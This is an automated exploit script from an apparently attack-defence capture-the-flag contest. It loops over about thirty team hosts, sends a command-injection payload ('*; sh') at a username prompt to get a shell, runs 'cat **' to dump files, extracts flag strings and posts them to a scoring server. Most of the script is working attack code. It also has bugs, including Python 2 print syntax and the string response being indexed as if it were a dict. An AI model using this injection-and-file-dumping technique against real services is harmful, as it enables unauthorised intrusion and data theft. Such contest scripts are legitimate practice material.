#!/usr/bin/env python

import sys
from pwn import *
import string
import random
import re
import suby
from time import sleep
import json
import requests
PORT = 5050
IPS =[
 {"ip": "10.115.1.2", "team_id": 1},
 {"ip": "10.115.1.18", "team_id": 2},
 {"ip": "10.115.1.34", "team_id": 3},
 {"ip": "10.115.1.50", "team_id": 4},
 {"ip": "10.115.1.66", "team_id": 5},
 {"ip": "10.115.1.82", "team_id": 6},
 {"ip": "10.115.1.98", "team_id": 7},
 {"ip": "10.115.1.114", "team_id": 8},
 {"ip": "10.115.1.130", "team_id": 9},
 {"ip": "10.115.1.146", "team_id": 10},
 {"ip": "10.115.1.162", "team_id": 11},
 {"ip": "10.115.1.178", "team_id": 12},
 {"ip": "10.115.1.194", "team_id": 13},
 {"ip": "10.115.1.210", "team_id": 14},
 {"ip": "10.115.1.226", "team_id": 15},
 {"ip": "10.115.1.242", "team_id": 16},
 {"ip": "10.115.2.2", "team_id": 17},
 {"ip": "10.115.2.18", "team_id": 18},
 {"ip": "10.115.2.34", "team_id": 19},
 {"ip": "10.115.2.50", "team_id": 20},
 {"ip": "10.115.2.82", "team_id": 22},
 {"ip": "10.115.2.98", "team_id": 23},
 {"ip": "10.115.2.114", "team_id": 24},
 {"ip": "10.115.2.130", "team_id": 25},
 {"ip": "10.115.2.146", "team_id": 26},
 {"ip": "10.115.2.162", "team_id": 27},
 {"ip": "10.115.2.178", "team_id": 28},
 {"ip": "10.115.2.226", "team_id": 29},
 {"ip": "10.115.2.194", "team_id": 30}
]
c = 0
def submit_flag(flag):
	global c
	f  =  open("log.f","r")
	flags = f.readlines()
	for i in flags:
		if(i==flag+'\n'):
			return
	f.close()
	f = open("log.f","a")
	f.write(flag)
	f.close()
	c = c+1
	url = "http://10.115.0.2:8000/flag"
	data = json.dumps({"flag": flag})
	# if the team name is bi0s and password is bi0s - you need base64 of "bi0s:bi0s"
	# header = {"Authorization": "Basic YmkwczpiaTBz"}
	header = {"Authorization": 'Basic <username:password>'}
	r = requests.post(url, data=data, headers=header)
	print r.text 
	if(r.text["result"]=="correct"):
		c =c+1
   	
	return



for i in IPS:
	try:

		ip = i["ip"]
		payload = "*; sh"
		r = remote(ip, PORT)
		r.recvuntil("Enter username: ")
		print(payload)
		r.sendline(payload)
		print(r.recv())
		r.sendline("2")
		print(r.recv())
		r.sendline("cat **")
		s = r.recv()
		s += r.recv()
		s = s.split(":")
		for i in range(len(s)):
			if s[i][:3] == "FLG":
				t = s[i][:16]
				print(t)
				submit_flag(t)
		r.close()
	except:
		r.close()
		pass
print(c)